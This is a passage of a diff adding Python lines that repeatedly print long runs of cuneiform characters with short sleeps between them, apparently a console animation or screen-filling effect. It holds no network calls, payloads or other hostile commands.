+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
